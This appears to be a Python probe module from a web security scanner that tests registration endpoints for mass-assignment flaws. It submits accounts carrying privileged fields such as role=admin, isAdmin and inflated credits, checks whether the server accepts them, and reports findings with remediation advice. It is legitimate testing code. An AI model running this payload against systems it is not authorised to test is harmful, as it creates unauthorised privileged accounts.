"""Mass-assignment / property-override probe.

Many frameworks blindly bind every key in a JSON request body onto the
target model. If a registration or profile-creation endpoint does not
allowlist its fields, an attacker can POST `role=admin` (or `credits=
999999`, `is_premium=true`, etc.) and have the server persist it.

The probe is two-step. It first POSTs a minimal-but-valid registration
body to a candidate path and captures the response. It then POSTs the
same body plus a payload of privileged fields. If the perturbation
response reflects any of those fields back with their elevated values,
or a follow-up GET on the new user record returns them elevated, that
is mass assignment.

Severity:
- critical when `role` reflects as `admin` or `isAdmin`/`is_admin` is
  reflected truthy.
- high for the money/tier fields (`credits`, `balance`, `is_premium`).

This probe creates accounts, hence the `destructive-low` tag. Emails are
randomised per run with `secrets.token_hex(4)` so re-runs don't collide.
"""
from __future__ import annotations

import json
import secrets
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get, http_post_json

# Common registration paths across modern stacks (Juice Shop, generic
# Express, Rails, Django REST, FastAPI scaffolds).
DEFAULT_CANDIDATES: tuple[str, ...] = (
    "/api/Users/",
    "/api/users/register",
    "/api/auth/register",
    "/api/v1/users",
    "/register",
)

# Privileged fields injected on the perturbation request. Each entry maps
# the JSON key to the elevated value plus the severity it implies.
PRIVILEGED_FIELDS: tuple[tuple[str, Any, str], ...] = (
    ("role", "admin", "critical"),
    ("isAdmin", True, "critical"),
    ("is_admin", True, "critical"),
    ("is_premium", True, "high"),
    ("credits", 999999, "high"),
    ("balance", 999999, "high"),
    ("verified", True, "high"),
    ("active", True, "high"),
)

_PASSWORD = "Ptai-1234!Aa"


def _random_email() -> str:
    return f"ptai-mass-{secrets.token_hex(4)}@example.com"


def _build_baseline(email: str) -> dict[str, Any]:
    return {"email": email, "password": _PASSWORD}


def _build_perturbation(email: str) -> dict[str, Any]:
    body = _build_baseline(email)
    for key, value, _sev in PRIVILEGED_FIELDS:
        body[key] = value
    return body


def _parse_json(body: str) -> Any:
    try:
        return json.loads(body)
    except (ValueError, TypeError):
        return None


def _walk_for_field(blob: Any, key: str) -> Any:
    """Depth-first search for `key` in a parsed JSON blob.

    Returns the first value found, or the sentinel `_MISSING` if not
    present. Recurses through dicts and lists so a wrapped envelope like
    `{"data": {"user": {...}}}` still matches.
    """
    if isinstance(blob, dict):
        if key in blob:
            return blob[key]
        for v in blob.values():
            found = _walk_for_field(v, key)
            if found is not _MISSING:
                return found
    elif isinstance(blob, list):
        for item in blob:
            found = _walk_for_field(item, key)
            if found is not _MISSING:
                return found
    return _MISSING


_MISSING = object()


def _is_elevated(field: str, expected: Any, observed: Any) -> bool:
    """Decide whether a reflected value counts as the elevated one."""
    if observed is _MISSING or observed is None:
        return False
    if isinstance(expected, bool):
        # JSON boolean true OR string "true"
        if observed is True:
            return True
        return bool(isinstance(observed, str) and observed.lower() == "true")
    if isinstance(expected, (int, float)):
        try:
            return float(observed) == float(expected)
        except (TypeError, ValueError):
            return False
    # string compare ("admin")
    return str(observed).lower() == str(expected).lower()


def _emit(
    target: str,
    severity: str,
    field: str,
    expected: Any,
    observed: Any,
    via: str,
) -> dict[str, Any]:
    return {
        "title": (
            f"Mass assignment: {field}={observed!r} accepted on registration"
        ),
        "severity": severity,
        "category": "business_logic",
        "target": target,
        "evidence": (
            f"Injected {field}={expected!r}; server reflected {observed!r} "
            f"({via})."
        ),
        "bug_class": "business_logic",
        "remediation": (
            "Allowlist accepted fields on user-creation endpoints. Strip "
            "privileged attributes (role, isAdmin, credits, balance) from "
            "the input DTO before persisting. Never bind raw request "
            "bodies onto ORM models."
        ),
    }


async def _follow_up_get(
    ctx: ProbeContext, base_url: str, user_id: Any
) -> Any:
    """GET the freshly-created user and return parsed JSON, or None."""
    if user_id is None or user_id is _MISSING:
        return None
    candidates = (
        f"{base_url.rstrip('/')}/{user_id}",
        f"{base_url.rstrip('/')}?id={user_id}",
    )
    for url in candidates:
        status, _, body = await http_get(ctx.session, url)
        if status == 200 and body:
            parsed = _parse_json(body)
            if parsed is not None:
                return parsed
    return None


@registry.probe(
    name="web.mass_assignment",
    bug_class="business_logic",
    severity_max="critical",
    owasp="A04:2021",
    runtime_budget_s=10.0,
    tags=("anonymous", "high-roi", "destructive-low"),
    requires_auth=False,
)
async def probe_mass_assignment(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Two-step mass-assignment probe.

    Step 1 sends a minimal valid registration. Step 2 repeats with the
    privileged-fields payload appended. If the response (or a follow-up
    GET on the user record) echoes any privileged field at its elevated
    value, emit a finding. Severity follows the field table.
    """
    candidates = ctx.candidate_endpoints or DEFAULT_CANDIDATES
    base = ctx.base
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path

        # Step 1: baseline registration.
        baseline_email = _random_email()
        b_status, _, b_body = await http_post_json(
            ctx.session, url, _build_baseline(baseline_email)
        )
        if b_status not in (200, 201):
            # Endpoint isn't a real registration sink; skip.
            continue

        # Step 2: perturbed registration with privileged fields.
        attack_email = _random_email()
        p_status, _, p_body = await http_post_json(
            ctx.session, url, _build_perturbation(attack_email)
        )
        if p_status not in (200, 201):
            continue

        parsed = _parse_json(p_body) or {}
        user_id = _walk_for_field(parsed, "id")

        # Pass 1: scan the registration response itself.
        response_hit_any = False
        for field_name, expected, severity in PRIVILEGED_FIELDS:
            observed = _walk_for_field(parsed, field_name)
            if _is_elevated(field_name, expected, observed):
                response_hit_any = True
                key = (url, field_name)
                if key in seen:
                    continue
                seen.add(key)
                findings.append(
                    _emit(url, severity, field_name, expected, observed, "response")
                )

        # Pass 2: only do a follow-up GET if the response told us nothing
        # AND we have an id to chase. Skipping otherwise keeps the probe
        # quiet on stripping servers (no extra GET traffic on negatives).
        if response_hit_any or user_id is _MISSING or user_id is None:
            continue
        followup = await _follow_up_get(ctx, url, user_id)
        if followup is None:
            continue
        for field_name, expected, severity in PRIVILEGED_FIELDS:
            observed_fu = _walk_for_field(followup, field_name)
            if _is_elevated(field_name, expected, observed_fu):
                key = (url, field_name)
                if key in seen:
                    continue
                seen.add(key)
                findings.append(
                    _emit(
                        url,
                        severity,
                        field_name,
                        expected,
                        observed_fu,
                        "follow_up_get",
                    )
                )

    return findings
